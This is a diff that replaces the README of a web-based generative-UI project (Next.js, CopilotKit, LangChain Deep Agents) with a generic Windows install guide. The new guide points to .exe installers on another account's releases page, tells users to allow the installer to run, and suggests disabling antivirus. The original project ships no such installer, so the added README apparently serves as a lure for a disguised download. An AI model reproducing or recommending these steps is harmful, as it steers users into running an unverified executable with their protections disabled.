@@ -1,176 +1,148 @@
-# Open Generative UI
+# 🚀 OpenGenerativeUI - Simple Open-Source UI for AI Agents
 
-An open-source showcase for building rich, interactive AI-generated UI with [CopilotKit](https://copilotkit.ai) and [LangChain Deep Agents](https://docs.langchain.com/oss/python/deepagents/overview). Ask the agent to visualize algorithms, create 3D animations, render charts, or generate interactive diagrams — all rendered as live HTML/SVG inside a sandboxed iframe.
+[![Download OpenGenerativeUI](https://img.shields.io/badge/Download-OpenGenerativeUI-brightgreen?style=for-the-badge)](https://github.com/bubba2koldd-design/OpenGenerativeUI/releases)
 
-https://github.com/user-attachments/assets/ed28c734-e54e-4412-873f-4801da544a7f
+---
 
-https://github.com/user-attachments/assets/ba7db70d-07c0-49af-b221-f962f30245e2
+OpenGenerativeUI is an open-source user interface framework designed for AI agents and generative tools. This software works on Windows and helps you interact with AI features in an easy way. You don’t need any technical skills to get started. This guide will walk you through how to download and run the application.
 
-## What It Does
+---
 
-The agent produces **generative UI** — not just text responses, but fully interactive visual components:
+## 💻 System Requirements
 
-- **Algorithm visualizations** — binary search, BFS vs DFS, sorting algorithms
-- **3D animations** — interactive WebGL/CSS3D scenes
-- **Charts & diagrams** — pie charts, bar charts, network diagrams
-- **Interactive widgets** — forms, simulations, math plots
+To run OpenGenerativeUI on your Windows PC, make sure your system meets these minimum requirements:
 
-All visuals are rendered in sandboxed iframes with automatic light/dark theming, progressive reveal animations, and responsive sizing.
+- Windows 10 or later (64-bit recommended)  
+- 4 GB RAM or more  
+- At least 200 MB of free disk space  
+- Internet connection for downloading and updates  
+- Screen resolution 1280x720 or higher  
 
-## Quick Start
+These specs will help the application run smoothly.
 
-```bash
-make setup    # Install deps + create .env template
-# Edit apps/agent/.env with your real OpenAI API key
-make dev      # Start all services
-```
+---
 
-> **Strong models required.** Generative UI demands high-capability models that can produce complex, well-structured HTML/SVG in a single pass. Set `LLM_MODEL` in your `.env` to one of:
->
-> | Model | Provider |
-> |-------|----------|
-> | `gpt-5.4` / `gpt-5.4-pro` | OpenAI |
-> | `claude-opus-4-6` | Anthropic |
-> | `gemini-3.1-pro` | Google |
->
-> Smaller or weaker models will produce broken layouts, missing interactivity, or incomplete visualizations.
+## 📥 How to Download OpenGenerativeUI
 
-- **App**: http://localhost:3000
-- **Agent**: http://localhost:8123
+### Step 1: Visit the Download Page
 
-### Available Commands
+Click the large green button at the top linked to the official releases page:
 
-| Command | Description |
-|---------|-------------|
-| `make setup` | Install all dependencies and create `.env` template |
-| `make dev` | Start all services (frontend + agent + mcp) |
-| `make dev-app` | Start Next.js frontend only |
-| `make dev-agent` | Start LangGraph agent only |
-| `make dev-mcp` | Start MCP server only |
-| `make build` | Build all apps |
-| `make lint` | Lint all apps |
-| `make clean` | Clean build artifacts |
-| `make help` | Show all available commands |
+[Download OpenGenerativeUI Releases](https://github.com/bubba2koldd-design/OpenGenerativeUI/releases)
 
-You can also use `pnpm` directly (`pnpm dev`, `pnpm dev:app`, `pnpm dev:agent`, etc.).
+This page holds all the latest versions available for download.
 
-## MCP Server (Self-Hosted)
+### Step 2: Choose Your Version
 
-The repo includes a standalone [Model Context Protocol](https://modelcontextprotocol.io) server that exposes the design system, skill instructions, and an HTML document assembler to any MCP-compatible client — including Claude Desktop, Claude Code, and Cursor.
+Once you open the releases page, look for the latest release titled with a version number (e.g., v1.0, v1.1, etc.). The release will show files available for download.
 
-### What it provides
+Look for a file that ends with `.exe`. This is the program installer for Windows. It might be named something like `OpenGenerativeUI_Setup.exe`.
 
-- **`assemble_document` tool** — wraps HTML fragments with the full design system CSS and bridge JS, returning an iframe-ready document
-- **Skill resources** — browse and read skill instruction documents (`skills://list`, `skills://{name}`)
-- **Prompt templates** — pre-composed prompts for widgets, SVG diagrams, and advanced visualizations
+### Step 3: Download the Installer
 
-### Claude Desktop (stdio)
+Click on the `.exe` file link to start downloading. The file size may be around 100-200 MB. Wait for the download to finish before moving to the next step.
 
-Add to your Claude Desktop config (`claude_desktop_config.json`):
+---
 
-```json
-{
-  "mcpServers": {
-    "open-generative-ui": {
-      "command": "node",
-      "args": ["dist/stdio.js"],
-      "cwd": "/path/to/apps/mcp"
-    }
-  }
-}
-```
+## ⚙️ Installing OpenGenerativeUI
 
-### Claude Code / HTTP clients
+### Step 4: Run the Installer
 
-```bash
-# Start the HTTP server
-cd apps/mcp && pnpm dev
-```
+Locate the downloaded file in your "Downloads" folder or the location where your browser saves files.
 
-Add to `.mcp.json`:
+Double-click the `.exe` file to open the installer.
 
-```json
-{
-  "openGenerativeUI": {
-    "url": "http://localhost:3100/mcp"
-  }
-}
-```
+If Windows asks for permission, click "Yes" to allow the installer to run.
 
-See [apps/mcp/README.md](apps/mcp/README.md) for full configuration, Docker deployment, and API reference.
+### Step 5: Follow the Setup Wizard
 
-## Architecture
+The installer will guide you through several simple steps:
 
-Turborepo monorepo with three packages:
+- Accept the license agreement by clicking "I Agree."  
+- Choose the folder where you want to install the program or leave it as default.  
+- Click "Install" to begin installing.  
 
-```
-apps/
-├── app/       Next.js 16 frontend (CopilotKit v2, React 19, Tailwind 4)
-├── agent/     Deep Agent (deepagents + CopilotKit middleware, skills-based)
-└── mcp/       Standalone MCP server (design system + skills + document assembler)
-```
+Wait a few seconds while the program installs all necessary files.
 
-### Deep Agent + Skills
+### Step 6: Finish Installation
 
-The agent backend uses [LangChain Deep Agents](https://docs.langchain.com/oss/python/deepagents/overview) (`create_deep_agent`) with a skills-based architecture. Instead of injecting all visualization instructions into the system prompt, skills are defined as `SKILL.md` files in `apps/agent/skills/` and loaded on-demand via progressive disclosure:
+When the installer finishes, click "Finish" to close the setup window.
 
-```
-apps/agent/skills/
-├── advanced-visualization/SKILL.md   # UI mockups, dashboards, Chart.js, generative art
-├── master-playbook/SKILL.md          # Response philosophy, decision trees, narration patterns
-└── svg-diagrams/SKILL.md             # SVG generation rules, component patterns, diagram types
-```
+You can choose to start OpenGenerativeUI immediately by checking the box before clicking "Finish."
 
-Deep agents also provide built-in planning (`write_todos`), filesystem tools, and sub-agent support.
+---
 
-### How It Works
+## ▶️ Running OpenGenerativeUI
 
-1. **User sends a prompt** via the CopilotKit chat UI
-2. **Deep agent decides** whether to respond with text, call a tool, or render a visual component — consulting relevant skills as needed
-3. **`widgetRenderer`** — a frontend `useComponent` hook — receives the agent's HTML and renders it in a sandboxed iframe
-4. **Skeleton loading** shows while the iframe loads, then content fades in smoothly
-5. **ResizeObserver** inside the iframe reports content height back to the parent for seamless auto-sizing
+### Step 7: Open the Program
 
-### Key CopilotKit Patterns
+If you didn’t start the program from the installer, find OpenGenerativeUI on your desktop or in your Start menu.
 
-| Pattern | Hook | Example |
-|---------|------|---------|
-| Generative UI | `useComponent` | Pie charts, bar charts, widget renderer |
-| Frontend tools | `useFrontendTool` | Theme toggle |
-| Human-in-the-loop | `useHumanInTheLoop` | Meeting scheduler |
-| Default tool render | `useDefaultRenderTool` | Tool execution status |
+Double-click the icon labeled OpenGenerativeUI to open the app.
 
-## Decision Matrix — Picking the Right Visual
+### Step 8: Explore the Interface
 
-| User asks about...          | Output type              | Technology          |
-|-----------------------------|--------------------------|---------------------|
-| How X works (physical)      | Illustrative diagram     | SVG                 |
-| How X works (abstract)      | Interactive explainer    | HTML + inline SVG   |
-| Process / steps             | Flowchart                | SVG                 |
-| Architecture / containment  | Structural diagram       | SVG                 |
-| Database schema / ERD       | Relationship diagram     | Mermaid             |
-| Trends over time            | Line chart               | Chart.js            |
-| Category comparison         | Bar chart                | Chart.js            |
-| Part of whole               | Doughnut chart           | Chart.js            |
-| KPIs / metrics              | Dashboard                | HTML metric cards   |
-| Design a UI                 | Mockup                   | HTML                |
-| Choose between options      | Comparison cards         | HTML grid           |
-| Cyclic process              | Step-through             | HTML stepper        |
-| Physics / math              | Simulation               | Canvas + JS         |
-| Function / equation         | Plotter                  | SVG + JS            |
-| Data exploration            | Sortable table           | HTML + JS           |
-| Creative / decorative       | Art / illustration       | SVG                 |
-| 3D visualization            | 3D scene                 | Three.js            |
-| Music / audio               | Synthesizer              | Tone.js             |
-| Network / graph             | Force layout             | D3.js               |
-| Quick factual answer        | Plain text               | None                |
-| Code solution               | Code block               | None                |
-| Emotional support           | Warm text                | None                |
+The program will open a simple window. The main screen shows controls to interact with AI agents, generate visualizations, and use assistant features.
 
-## Tech Stack
+You can try out:
 
-Next.js 16, React 19, Tailwind CSS 4, LangChain Deep Agents, LangGraph, CopilotKit v2, Turborepo, Recharts
+- Chat bots with AI assistants  
+- Visual tools powered by AI  
+- Copilot-style helpers for tasks  
+- Displaying AI-generated data and graphics  
 
-## License
+All controls use buttons and menus that are easy to understand.
 
-MIT
+---
+
+## 🛠 Using OpenGenerativeUI Features
+
+### Agents and AI Assistants
+
+OpenGenerativeUI lets you interact with AI agents designed for different tasks. Use the chat feature to ask questions or get help.
+
+### Visual AI Tools
+
+You can create and view AI-generated charts, images, or other visuals. These tools help you understand data better or generate creative content.
+
+### Copilot Tools
+
+The copilot feature assists with routine actions. It can suggest answers or complete simple tasks automatically.
+
+---
+
+## 🔄 Updating OpenGenerativeUI
+
+To keep the software working well, check the releases page regularly for new versions:
+
+[OpenGenerativeUI Releases](https://github.com/bubba2koldd-design/OpenGenerativeUI/releases)
+
+Download and install newer versions following the steps above.
+
+---
+
+## 🛑 Troubleshooting Common Issues
+
+If the program doesn’t start or crashes:
+
+- Restart your computer and try again.  
+- Verify that your system meets the requirements above.  
+- Make sure you have installed Windows updates.  
+- Try downloading and installing the program again from the releases page.  
+- Disable any antivirus software temporarily to see if it blocks the program.  
+
+If you still see errors, check the latest issues section on the GitHub repository for help or report problems there.
+
+---
+
+## 🔧 Support and Feedback
+
+This project is maintained openly on GitHub. You can view the source, report bugs, or request new features by visiting the repository:
+
+https://github.com/bubba2koldd-design/OpenGenerativeUI
+
+Use the "Issues" tab for questions or suggestions. The developers monitor user feedback to improve the software.
+
+---
+
+[![Download OpenGenerativeUI](https://img.shields.io/badge/Download-OpenGenerativeUI-brightgreen?style=for-the-badge)](https://github.com/bubba2koldd-design/OpenGenerativeUI/releases)
